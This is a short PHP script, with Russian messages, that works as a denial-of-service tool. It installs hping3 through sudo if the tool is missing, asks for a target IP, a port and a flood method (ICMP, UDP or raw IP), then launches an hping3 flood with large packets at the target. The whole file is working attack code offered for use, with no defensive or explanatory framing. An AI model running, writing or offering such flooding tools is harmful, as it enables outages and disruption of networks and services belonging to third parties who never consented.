<?php

declare(strict_types=1);

function checkHping3(): bool{
    exec("command -v hping3", $output, $return_var);
    return $return_var === 0;
}

function installHping3(): void{
    echo "hping3 не установлен. Попытка установки...\n";
    exec("uname -a", $os_info);
    
    if (stripos($os_info[0], 'ubuntu') !== false || stripos($os_info[0], 'debian') !== false) {
        exec("sudo apt-get update && sudo apt-get install -y hping3", $output, $return_var);
    } elseif (stripos($os_info[0], 'centos') !== false || stripos($os_info[0], 'redhat') !== false) {
        exec("sudo yum install -y hping3", $output, $return_var);
    } else {
        die("Ошибка: Неизвестная операционная система. Пожалуйста, установите hping3 вручную.\n");
    }

    if($return_var !== 0){
        die("Ошибка: Не удалось установить hping3. Пожалуйста, установите его вручную.\n");
    }

    echo "hping3 успешно установлен.\n";
}

if (!checkHping3()){
    installHping3();
}

function isValidIP(string $ip): bool{
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

do{
    echo "IP Target: ";
    $ip = trim(fgets(STDIN));
}while (!isValidIP($ip));

usleep(5000);

do{
    echo "PORT Target: ";
    $port = (int) fgets(STDIN);
}while ($port <= 0 || $port > 65535);

usleep(5000);

$validMethods = ['icmp', 'udp', 'rawip', 1, 2, 3];
do {
    echo "DOS Method (icmp=1, udp=2, rawip=3): ";
    $methodInput = trim(fgets(STDIN));
    $methodInputLower = strtolower($methodInput);
    
    if (is_numeric($methodInputLower)){
        $method = (int)$methodInputLower;
    }elseif (in_array($methodInputLower, ['icmp', 'udp', 'rawip'])){
        $method = array_search($methodInputLower, ['icmp', 'udp', 'rawip']) + 1;
    }else{
        echo "Неверный метод. Пожалуйста, введите icmp, udp, rawip или соответствующий номер.\n";
        $method = null;
    }
}while ($method === null);

usleep(15000);
echo "Attack Target!!!\n\n";

if ($method === 1){
    exec("hping3 --icmp --flood -d 63333 -V -p {$port} {$ip}");

} elseif ($method === 2){
    exec("hping3 --udp --flood -d 63333 -V -p {$port} {$ip}");

} elseif ($method === 3){
    exec("hping3 --rawip --flood -d 63333 -V -p {$port} {$ip}");
}
